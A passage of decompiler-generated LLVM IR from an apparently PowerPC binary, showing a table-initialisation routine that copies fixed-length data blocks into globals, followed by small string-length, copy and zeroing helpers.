  store i16 3, i16* bitcast (i32* @global_var_1001b3e8.244 to i16*), align 4
  %v0_10007080 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007080, i32* @global_var_1001b3e4.245, align 4
  store i32 268464264, i32* @lr, align 4
  %v0_10007084 = call i32 @function_10008d68()
  store i32 %v0_10007084, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000709c.247 to i32), i32* @lr, align 4
  %v3_10007098 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000ab2c.246 to i32), i32 19, i32 19)
  store i32 24, i32* @r3, align 4
  %v0_100070a0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100070a0, i32* @global_var_1001b3ec.248, align 4
  store i32 12, i32* %r27.global-to-local, align 4
  %v0_100070a8 = load i32, i32* %r21.global-to-local, align 4
  %v1_100070a8 = trunc i32 %v0_100070a8 to i16
  store i16 %v1_100070a8, i16* bitcast (i32* @global_var_1001b3f0.249 to i16*), align 4
  store i32 268464304, i32* @lr, align 4
  %v0_100070ac = call i32 @function_10008d68()
  store i32 %v0_100070ac, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100070c4.251 to i32), i32* @lr, align 4
  %v3_100070c0 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a984.250 to i32), i32 24, i32 24)
  store i32 9, i32* @r3, align 4
  store i16 24, i16* bitcast (i32* @global_var_1001b3f8.252 to i16*), align 4
  %v0_100070d0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100070d0, i32* @global_var_1001b3f4.253, align 4
  store i32 268464344, i32* @lr, align 4
  %v0_100070d4 = call i32 @function_10008d68()
  store i32 %v0_100070d4, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100070ec.255 to i32), i32* @lr, align 4
  %v3_100070e8 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a9a0.254 to i32), i32 9, i32 9)
  store i32 16, i32* @r3, align 4
  %v0_100070f0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100070f0, i32* @global_var_1001b3fc.256, align 4
  %v0_100070f4 = load i32, i32* %r24.global-to-local, align 4
  %v1_100070f4 = trunc i32 %v0_100070f4 to i16
  store i16 %v1_100070f4, i16* bitcast (i32* @global_var_1001b400.257 to i16*), align 4
  store i32 268464380, i32* @lr, align 4
  %v0_100070f8 = call i32 @function_10008d68()
  store i32 %v0_100070f8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007110.259 to i32), i32* @lr, align 4
  %v3_1000710c = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000ab40.258 to i32), i32 16, i32 16)
  store i32 22, i32* @r3, align 4
  %v0_10007114 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007114, i32* @global_var_1001b404.260, align 4
  %v0_10007118 = load i32, i32* %r22.global-to-local, align 4
  %v1_10007118 = trunc i32 %v0_10007118 to i16
  store i16 %v1_10007118, i16* bitcast (i32* @global_var_1001b408.261 to i16*), align 4
  store i32 268464416, i32* @lr, align 4
  %v0_1000711c = call i32 @function_10008d68()
  store i32 %v0_1000711c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10007134.263 to i32), i32* @lr, align 4
  %v3_10007130 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000ab54.262 to i32), i32 22, i32 22)
  store i32 21, i32* @r3, align 4
  store i16 22, i16* bitcast (i32* @global_var_1001b410.264 to i16*), align 4
  %v0_10007140 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007140, i32* @global_var_1001b40c.265, align 4
  store i32 268464456, i32* @lr, align 4
  %v0_10007144 = call i32 @function_10008d68()
  store i32 %v0_10007144, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000715c.267 to i32), i32* @lr, align 4
  %v3_10007158 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a9ac.266 to i32), i32 21, i32 21)
  store i32 17, i32* @r3, align 4
  store i16 21, i16* bitcast (i32* @global_var_1001b418.268 to i16*), align 4
  %v0_10007168 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007168, i32* @global_var_1001b414.269, align 4
  store i32 268464496, i32* @lr, align 4
  %v0_1000716c = call i32 @function_10008d68()
  store i32 %v0_1000716c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10007184.271 to i32), i32* @lr, align 4
  %v3_10007180 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a9c4.270 to i32), i32 17, i32 17)
  store i32 12, i32* @r3, align 4
  store i16 17, i16* bitcast (i32* @global_var_1001b420.272 to i16*), align 4
  %v0_10007190 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007190, i32* @global_var_1001b41c.273, align 4
  store i32 268464536, i32* @lr, align 4
  %v0_10007194 = call i32 @function_10008d68()
  store i32 %v0_10007194, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100071ac.275 to i32), i32* @lr, align 4
  %v3_100071a8 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a9d8.274 to i32), i32 12, i32 12)
  store i32 23, i32* @r3, align 4
  %v0_100071b0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100071b0, i32* @global_var_1001b424.276, align 4
  %v0_100071b4 = load i32, i32* %r27.global-to-local, align 4
  %v1_100071b4 = trunc i32 %v0_100071b4 to i16
  store i16 %v1_100071b4, i16* bitcast (i32* @global_var_1001b428.277 to i16*), align 4
  store i32 268464572, i32* @lr, align 4
  %v0_100071b8 = call i32 @function_10008d68()
  store i32 %v0_100071b8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100071d0.279 to i32), i32* @lr, align 4
  %v3_100071cc = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a9e8.278 to i32), i32 23, i32 23)
  store i32 83, i32* @r3, align 4
  store i16 23, i16* bitcast (i32* @global_var_1001b430.280 to i16*), align 4
  %v0_100071dc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100071dc, i32* @global_var_1001b42c.281, align 4
  store i32 268464612, i32* @lr, align 4
  %v0_100071e0 = call i32 @function_10008d68()
  store i32 %v0_100071e0, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100071f8.283 to i32), i32* @lr, align 4
  %v3_100071f4 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000ab6c.282 to i32), i32 83, i32 83)
  store i32 32, i32* @r3, align 4
  store i16 83, i16* bitcast (i32* @global_var_1001b438.284 to i16*), align 4
  %v0_10007204 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007204, i32* @global_var_1001b434.285, align 4
  store i32 268464652, i32* @lr, align 4
  %v0_10007208 = call i32 @function_10008d68()
  store i32 %v0_10007208, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10007220.287 to i32), i32* @lr, align 4
  %v3_1000721c = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000aa00.286 to i32), i32 32, i32 32)
  store i32 48, i32* @r3, align 4
  store i16 32, i16* bitcast (i32* @global_var_1001b440.288 to i16*), align 4
  %v0_1000722c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000722c, i32* @global_var_1001b43c.289, align 4
  store i32 268464692, i32* @lr, align 4
  %v0_10007230 = call i32 @function_10008d68()
  store i32 %v0_10007230, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10007248.291 to i32), i32* @lr, align 4
  %v3_10007244 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000aa24.290 to i32), i32 48, i32 48)
  store i32 12, i32* @r3, align 4
  store i16 48, i16* bitcast (i32* @global_var_1001b448.292 to i16*), align 4
  %v0_10007254 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007254, i32* @global_var_1001b444.293, align 4
  store i32 268464732, i32* @lr, align 4
  %v0_10007258 = call i32 @function_10008d68()
  store i32 %v0_10007258, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007270.295 to i32), i32* @lr, align 4
  %v3_1000726c = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000aa58.294 to i32), i32 12, i32 12)
  store i32 9, i32* @r3, align 4
  %v0_10007274 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007274, i32* @global_var_1001b44c.296, align 4
  %v0_10007278 = load i32, i32* %r27.global-to-local, align 4
  %v1_10007278 = trunc i32 %v0_10007278 to i16
  store i16 %v1_10007278, i16* bitcast (i32* @global_var_1001b450.297 to i16*), align 4
  store i32 268464768, i32* @lr, align 4
  %v0_1000727c = call i32 @function_10008d68()
  store i32 %v0_1000727c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007294.299 to i32), i32* @lr, align 4
  %v3_10007290 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000aa68.298 to i32), i32 9, i32 9)
  store i32 10, i32* @r3, align 4
  %v0_10007298 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007298, i32* @global_var_1001b454.300, align 4
  %v0_1000729c = load i32, i32* %r24.global-to-local, align 4
  %v1_1000729c = trunc i32 %v0_1000729c to i16
  store i16 %v1_1000729c, i16* bitcast (i32* @global_var_1001b458.301 to i16*), align 4
  store i32 268464804, i32* @lr, align 4
  %v0_100072a0 = call i32 @function_10008d68()
  store i32 %v0_100072a0, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100072b8.303 to i32), i32* @lr, align 4
  %v3_100072b4 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000aa74.302 to i32), i32 10, i32 10)
  store i32 12, i32* @r3, align 4
  %v0_100072bc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100072bc, i32* @global_var_1001b45c.304, align 4
  %v0_100072c0 = load i32, i32* %r26.global-to-local, align 4
  %v1_100072c0 = trunc i32 %v0_100072c0 to i16
  store i16 %v1_100072c0, i16* bitcast (i32* @global_var_1001b460.305 to i16*), align 4
  store i32 268464840, i32* @lr, align 4
  %v0_100072c4 = call i32 @function_10008d68()
  store i32 %v0_100072c4, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100072dc.307 to i32), i32* @lr, align 4
  %v3_100072d8 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000aa80.306 to i32), i32 12, i32 12)
  store i32 16, i32* @r3, align 4
  %v0_100072e0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100072e0, i32* @global_var_1001b464.308, align 4
  %v0_100072e4 = load i32, i32* %r27.global-to-local, align 4
  %v1_100072e4 = trunc i32 %v0_100072e4 to i16
  store i16 %v1_100072e4, i16* bitcast (i32* @global_var_1001b468.309 to i16*), align 4
  store i32 268464876, i32* @lr, align 4
  %v0_100072e8 = call i32 @function_10008d68()
  store i32 %v0_100072e8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007300.311 to i32), i32* @lr, align 4
  %v3_100072fc = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000aa90.310 to i32), i32 16, i32 16)
  store i32 19, i32* @r3, align 4
  %v0_10007304 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007304, i32* @global_var_1001b46c.312, align 4
  %v0_10007308 = load i32, i32* %r22.global-to-local, align 4
  %v1_10007308 = trunc i32 %v0_10007308 to i16
  store i16 %v1_10007308, i16* bitcast (i32* @global_var_1001b470.313 to i16*), align 4
  store i32 268464912, i32* @lr, align 4
  %v0_1000730c = call i32 @function_10008d68()
  store i32 %v0_1000730c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007324.315 to i32), i32* @lr, align 4
  %v3_10007320 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000aaa4.314 to i32), i32 19, i32 19)
  store i32 8, i32* @r3, align 4
  %v0_10007328 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007328, i32* @global_var_1001b474.316, align 4
  %v0_1000732c = load i32, i32* %r21.global-to-local, align 4
  %v1_1000732c = trunc i32 %v0_1000732c to i16
  store i16 %v1_1000732c, i16* bitcast (i32* @global_var_1001b478.317 to i16*), align 4
  store i32 268464948, i32* @lr, align 4
  %v0_10007330 = call i32 @function_10008d68()
  store i32 %v0_10007330, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007348.319 to i32), i32* @lr, align 4
  %v3_10007344 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000aab8.318 to i32), i32 8, i32 8)
  store i32 11, i32* @r3, align 4
  %v0_1000734c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000734c, i32* @global_var_1001b47c.320, align 4
  %v0_10007350 = load i32, i32* %r25.global-to-local, align 4
  %v1_10007350 = trunc i32 %v0_10007350 to i16
  store i16 %v1_10007350, i16* bitcast (i32* @global_var_1001b480.321 to i16*), align 4
  store i32 268464984, i32* @lr, align 4
  %v0_10007354 = call i32 @function_10008d68()
  store i32 %v0_10007354, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000736c.323 to i32), i32* @lr, align 4
  %v3_10007368 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000a9f4.322 to i32), i32 11, i32 11)
  store i32 12, i32* @r3, align 4
  %v0_10007370 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007370, i32* @global_var_1001b484.324, align 4
  %v0_10007374 = load i32, i32* %r23.global-to-local, align 4
  %v1_10007374 = trunc i32 %v0_10007374 to i16
  store i16 %v1_10007374, i16* bitcast (i32* @global_var_1001b488.325 to i16*), align 4
  store i32 268465020, i32* @lr, align 4
  %v0_10007378 = call i32 @function_10008d68()
  store i32 %v0_10007378, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007390.327 to i32), i32* @lr, align 4
  %v3_1000738c = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000aac4.326 to i32), i32 12, i32 12)
  store i32 18, i32* @r3, align 4
  %v0_10007394 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007394, i32* @global_var_1001b48c.328, align 4
  %v0_10007398 = load i32, i32* %r27.global-to-local, align 4
  %v1_10007398 = trunc i32 %v0_10007398 to i16
  store i16 %v1_10007398, i16* bitcast (i32* @global_var_1001b490.329 to i16*), align 4
  store i32 268465056, i32* @lr, align 4
  %v0_1000739c = call i32 @function_10008d68()
  store i32 %v0_1000739c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100073b4.331 to i32), i32* @lr, align 4
  %v3_100073b0 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000aad4.330 to i32), i32 18, i32 18)
  store i32 25, i32* @r3, align 4
  store i16 18, i16* bitcast (i32* @global_var_1001b498.332 to i16*), align 4
  %v0_100073c0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100073c0, i32* @global_var_1001b494.333, align 4
  store i32 268465096, i32* @lr, align 4
  %v0_100073c4 = call i32 @function_10008d68()
  store i32 %v0_100073c4, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100073dc.335 to i32), i32* @lr, align 4
  %v3_100073d8 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000aae8.334 to i32), i32 25, i32 25)
  store i32 111, i32* @r3, align 4
  store i16 25, i16* bitcast (i32* @global_var_1001b4a0.336 to i16*), align 4
  %v0_100073e8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100073e8, i32* @global_var_1001b49c.337, align 4
  store i32 268465136, i32* @lr, align 4
  %v0_100073ec = call i32 @function_10008d68()
  store i32 %v0_100073ec, i32* %r28.global-to-local, align 4
  store i32 111, i32* %r27.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007408.339 to i32), i32* @lr, align 4
  %v3_10007404 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000abc0.338 to i32), i32 111, i32 111)
  store i32 111, i32* @r3, align 4
  %v0_1000740c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000740c, i32* @global_var_1001b4a4.340, align 4
  %v0_10007410 = load i32, i32* %r27.global-to-local, align 4
  %v1_10007410 = trunc i32 %v0_10007410 to i16
  store i16 %v1_10007410, i16* bitcast (i32* @global_var_1001b4a8.341 to i16*), align 4
  store i32 268465176, i32* @lr, align 4
  %v0_10007414 = call i32 @function_10008d68()
  store i32 %v0_10007414, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000742c.343 to i32), i32* @lr, align 4
  %v3_10007428 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000ac30.342 to i32), i32 111, i32 111)
  store i32 110, i32* @r3, align 4
  %v0_10007430 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007430, i32* @global_var_1001b4ac.344, align 4
  %v0_10007434 = load i32, i32* %r27.global-to-local, align 4
  %v1_10007434 = trunc i32 %v0_10007434 to i16
  store i16 %v1_10007434, i16* bitcast (i32* @global_var_1001b4b0.345 to i16*), align 4
  store i32 268465212, i32* @lr, align 4
  %v0_10007438 = call i32 @function_10008d68()
  store i32 %v0_10007438, i32* %r28.global-to-local, align 4
  store i32 110, i32* %r27.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007454.347 to i32), i32* @lr, align 4
  %v3_10007450 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000aca0.346 to i32), i32 110, i32 110)
  store i32 110, i32* @r3, align 4
  %v0_10007458 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007458, i32* @global_var_1001b4b4.348, align 4
  %v0_1000745c = load i32, i32* %r27.global-to-local, align 4
  %v1_1000745c = trunc i32 %v0_1000745c to i16
  store i16 %v1_1000745c, i16* bitcast (i32* @global_var_1001b4b8.349 to i16*), align 4
  store i32 268465252, i32* @lr, align 4
  %v0_10007460 = call i32 @function_10008d68()
  store i32 %v0_10007460, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007478.351 to i32), i32* @lr, align 4
  %v3_10007474 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000ad10.350 to i32), i32 110, i32 110)
  store i32 117, i32* @r3, align 4
  %v0_1000747c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000747c, i32* @global_var_1001b4bc.352, align 4
  %v0_10007480 = load i32, i32* %r27.global-to-local, align 4
  %v1_10007480 = trunc i32 %v0_10007480 to i16
  store i16 %v1_10007480, i16* bitcast (i32* @global_var_1001b4c0.353 to i16*), align 4
  store i32 268465288, i32* @lr, align 4
  %v0_10007484 = call i32 @function_10008d68()
  store i32 %v0_10007484, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000749c.355 to i32), i32* @lr, align 4
  %v3_10007498 = call i32 @function_10007560(i32 ptrtoint (i32* @global_var_1000ad80.354 to i32), i32 117, i32 117)
  store i16 117, i16* bitcast (i32* @global_var_1001b4c8.356 to i16*), align 4
  %v0_100074a8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100074a8, i32* @global_var_1001b4c4.357, align 4
  store i32 %v0_10006cfc, i32* %r28.global-to-local, align 4
  ret i32 %v3_10007498

; uselistorder directives
  uselistorder i32 110, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32 111, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32 21, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 33, { 0, 1, 5, 6, 7, 2, 8, 3, 9, 4, 10 }
  uselistorder i32 (i32, i32, i32)* @function_10007560, { 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_100074dc(i8* %arg1) local_unnamed_addr {
dec_label_pc_100074dc:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_100074dc = load i8, i8* %arg1, align 1
  %v3_100074e8 = icmp eq i8 %v3_100074dc, 0
  %v0_100074ec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100074e8, i32 %v0_100074ec)
  br label %dec_label_pc_100074f0

dec_label_pc_100074f0:                            ; preds = %dec_label_pc_100074f0, %dec_label_pc_100074dc
  %v0_100074f0 = phi i32 [ %v1_100074f0, %dec_label_pc_100074f0 ], [ 0, %dec_label_pc_100074dc ]
  %v1_100074f0 = add i32 %v0_100074f0, 1
  %v2_100074f4 = add i32 %v1_100074f0, %tmp
  %v3_100074f4 = inttoptr i32 %v2_100074f4 to i8*
  %v4_100074f4 = load i8, i8* %v3_100074f4, align 1
  %v3_100074f8 = icmp eq i8 %v4_100074f4, 0
  br i1 %v3_100074f8, label %dec_label_pc_10007500, label %dec_label_pc_100074f0

dec_label_pc_10007500:                            ; preds = %dec_label_pc_100074f0
  ret i32 %v1_100074f0
}

define i32 @function_10007504(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007504:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_10007504 = load i8, i8* %arg1, align 1
  %v3_10007508 = icmp eq i8 %v2_10007504, 0
  br i1 %v3_10007508, label %dec_label_pc_10007554, label %dec_label_pc_10007510

dec_label_pc_10007510:                            ; preds = %dec_label_pc_10007504
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10007514

dec_label_pc_10007514:                            ; preds = %dec_label_pc_10007514, %dec_label_pc_10007510
  %v0_10007514 = phi i32 [ %v1_10007514, %dec_label_pc_10007514 ], [ 0, %dec_label_pc_10007510 ]
  %v1_10007514 = add i32 %v0_10007514, 1
  store i32 %v1_10007514, i32* %r9.global-to-local, align 4
  %v2_10007518 = add i32 %v1_10007514, %tmp
  %v3_10007518 = inttoptr i32 %v2_10007518 to i8*
  %v4_10007518 = load i8, i8* %v3_10007518, align 1
  %v3_1000751c = icmp eq i8 %v4_10007518, 0
  br i1 %v3_1000751c, label %dec_label_pc_10007524, label %dec_label_pc_10007514

dec_label_pc_10007524:                            ; preds = %dec_label_pc_10007514
  %v3_10007524 = icmp eq i32 %v1_10007514, -1
  br i1 %v3_10007524, label %dec_label_pc_1000754c, label %dec_label_pc_1000752c

dec_label_pc_1000752c:                            ; preds = %dec_label_pc_10007524
  %phitmp = add i32 %v0_10007514, 2
  br label %dec_label_pc_10007530

dec_label_pc_10007530:                            ; preds = %dec_label_pc_10007554, %dec_label_pc_1000752c
  %v0_10007530 = phi i32 [ 1, %dec_label_pc_10007554 ], [ %phitmp, %dec_label_pc_1000752c ]
  store i32 %v0_10007530, i32* %ctr.global-to-local, align 4
  %v2_10007540.pre = load i32, i32* @r3, align 4
  %v2_100075388 = load i8, i8* %arg1, align 1
  %v1_1000753c10 = add i32 %tmp, 1
  store i32 %v1_1000753c10, i32* %r4.global-to-local, align 4
  %v3_1000754011 = inttoptr i32 %v2_10007540.pre to i8*
  store i8 %v2_100075388, i8* %v3_1000754011, align 1
  %v0_1000754412 = load i32, i32* @r3, align 4
  %v1_1000754413 = add i32 %v0_1000754412, 1
  store i32 %v1_1000754413, i32* %r3.global-to-local, align 4
  %v0_1000754814 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000754815 = add i32 %v0_1000754814, -1
  store i32 %v1_1000754815, i32* %ctr.global-to-local, align 4
  %v2_1000754816 = icmp eq i32 %v1_1000754815, 0
  br i1 %v2_1000754816, label %dec_label_pc_1000754c.loopexit, label %dec_label_pc_10007538.dec_label_pc_10007538_crit_edge

dec_label_pc_10007538.dec_label_pc_10007538_crit_edge: ; preds = %dec_label_pc_10007530, %dec_label_pc_10007538.dec_label_pc_10007538_crit_edge
  %v1_1000754417 = phi i32 [ %v1_10007544, %dec_label_pc_10007538.dec_label_pc_10007538_crit_edge ], [ %v1_1000754413, %dec_label_pc_10007530 ]
  %v0_10007538.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_10007538 = inttoptr i32 %v0_10007538.pre to i8*
  %v2_10007538 = load i8, i8* %v1_10007538, align 1
  %v1_1000753c = add i32 %v0_10007538.pre, 1
  store i32 %v1_1000753c, i32* %r4.global-to-local, align 4
  %v3_10007540 = inttoptr i32 %v1_1000754417 to i8*
  store i8 %v2_10007538, i8* %v3_10007540, align 1
  %v0_10007544 = load i32, i32* %r3.global-to-local, align 4
  %v1_10007544 = add i32 %v0_10007544, 1
  store i32 %v1_10007544, i32* %r3.global-to-local, align 4
  %v0_10007548 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007548 = add i32 %v0_10007548, -1
  store i32 %v1_10007548, i32* %ctr.global-to-local, align 4
  %v2_10007548 = icmp eq i32 %v1_10007548, 0
  br i1 %v2_10007548, label %dec_label_pc_1000754c.loopexit, label %dec_label_pc_10007538.dec_label_pc_10007538_crit_edge

dec_label_pc_1000754c.loopexit:                   ; preds = %dec_label_pc_10007538.dec_label_pc_10007538_crit_edge, %dec_label_pc_10007530
  %v0_1000754c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000754c

dec_label_pc_1000754c:                            ; preds = %dec_label_pc_1000754c.loopexit, %dec_label_pc_10007524
  %v0_1000754c = phi i32 [ %v0_1000754c.pre, %dec_label_pc_1000754c.loopexit ], [ -1, %dec_label_pc_10007524 ]
  store i32 %v0_1000754c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000754c

dec_label_pc_10007554:                            ; preds = %dec_label_pc_10007504
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10007530

; uselistorder directives
  uselistorder i32 %v0_1000754c, { 1, 0 }
  uselistorder i32 %v1_10007548, { 1, 0 }
  uselistorder i32 %v1_10007544, { 1, 0 }
  uselistorder i32 %v1_10007514, { 0, 1, 3, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 1, 0 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_10007538.dec_label_pc_10007538_crit_edge, { 1, 0 }
}

define i32 @function_10007560(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10007560:
  %ctr.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_10007560 = icmp eq i32 %arg3, 0
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v0_10007568 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10007560, i32 %v0_10007568)
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10007570

dec_label_pc_10007570:                            ; preds = %dec_label_pc_10007570, %dec_label_pc_10007560
  %v0_10007570 = phi i32 [ %v1_10007578, %dec_label_pc_10007570 ], [ 0, %dec_label_pc_10007560 ]
  %v2_10007570 = add i32 %v0_10007570, %arg2
  %v3_10007570 = inttoptr i32 %v2_10007570 to i8*
  %v4_10007570 = load i8, i8* %v3_10007570, align 1
  %v4_10007574 = add i32 %v0_10007570, %arg1
  %v5_10007574 = inttoptr i32 %v4_10007574 to i8*
  store i8 %v4_10007570, i8* %v5_10007574, align 1
  %v0_10007578 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007578 = add i32 %v0_10007578, 1
  store i32 %v1_10007578, i32* %r9.global-to-local, align 4
  %v0_1000757c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000757c = add i32 %v0_1000757c, -1
  store i32 %v1_1000757c, i32* %ctr.global-to-local, align 4
  %v2_1000757c = icmp eq i32 %v1_1000757c, 0
  br i1 %v2_1000757c, label %dec_label_pc_10007580, label %dec_label_pc_10007570

dec_label_pc_10007580:                            ; preds = %dec_label_pc_10007570
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000757c, { 1, 0 }
  uselistorder i32 %v1_10007578, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_10007584() local_unnamed_addr {
dec_label_pc_10007584:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10007584 = load i32, i32* @r4, align 4
  store i32 %v0_10007584, i32* %r0.global-to-local, align 4
  %v3_10007584 = icmp eq i32 %v0_10007584, 0
  store i32 %v0_10007584, i32* %ctr.global-to-local, align 4
  %v0_1000758c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10007584, i32 %v0_1000758c)
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100075983 = load i32, i32* @r3, align 4
  %v5_100075984 = inttoptr i32 %v2_100075983 to i8*
  store i8 0, i8* %v5_100075984, align 1
  %v0_1000759c5 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000759c6 = add i32 %v0_1000759c5, 1
  store i32 %v1_1000759c6, i32* %r9.global-to-local, align 4
  %v0_100075a07 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100075a08 = add i32 %v0_100075a07, -1
  store i32 %v1_100075a08, i32* %ctr.global-to-local, align 4
